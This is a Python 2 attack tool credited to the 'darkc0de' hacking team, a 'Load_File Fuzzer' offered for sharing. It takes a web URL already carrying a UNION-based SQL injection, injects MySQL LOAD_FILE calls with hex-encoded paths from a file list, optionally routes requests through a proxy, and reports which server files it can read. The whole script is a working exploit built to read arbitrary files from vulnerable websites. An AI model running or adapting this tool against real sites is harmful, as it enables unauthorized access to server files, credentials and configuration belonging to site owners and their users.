#!/usr/bin/python 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# Load_File Fuzzer 
 
# Share the c0de! 
 
# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com 
 
# Greetz to 
# d3hydr8, Tarsian, c0mrade (r.i.p brotha), reverenddigitalx, rechemen 
# and the darkc0de crew 
 
import urllib2, sys, re, httplib, socket 
 
#Add proxy support: Format  127.0.0.1:8080 
proxy = "None" 
 
if len(sys.argv) != 3: 
	print "\n\tUsage: ./load_fuzz.py <site> <list>" 
	print "\n\tEx: ./load_fuzz.py \"www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,darkc0de,3--\" filelist.txt\n" 
	sys.exit(1) 
 
siteurl = sys.argv[1] 
filelist = open(sys.argv[2], "r").readlines() 
 
if siteurl[:7] != "http://": 
	siteurl = "http://"+siteurl 
if siteurl.find("darkc0de") == -1: 
	print "\n[-] Site must contain \"darkc0de\"\n" 
	sys.exit(1) 
 
print "\n   rsauron@darkc0de.com Load_File Fuzzer v1.0" 
print " ----------------------------------------------" 
 
try: 
	if proxy != "None": 
		print "\n[+] Testing Proxy..." 
		h2 = httplib.HTTPConnection(proxy) 
		h2.connect() 
		print "[+] Proxy:",proxy 
		print "[+] Building Handler" 
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'}) 
	else: 
		print "\n[-] Proxy Not Given" 
		proxy_handler = "" 
except(socket.timeout): 
	print "\n[-] Proxy Timed Out" 
	proxy_handler = "" 
	sys.exit(1) 
except: 
	print "\n[-] Proxy Failed" 
	proxy_handler = "" 
	sys.exit(1) 
print 
for sysfile in filelist: 
    if sysfile.endswith("\n"): 
        sysfile = sysfile.rstrip("\n") 
    finalurl = siteurl.replace("darkc0de","concat(LOAD_FILE(0x"+sysfile.encode("hex")+"),0x3a,0x6461726b63306465)") 
    opener = urllib2.build_opener(proxy_handler) 
    source = opener.open(finalurl).read() 
    match = re.findall("darkc0de",source) 
    if len(match) > 0: 
        print "[!] Found",sysfile 
        print "[!]",siteurl.replace("darkc0de","LOAD_FILE(0x"+sysfile.encode("hex")+")") 
print "\n[-] Searching done!" 
#EOF 
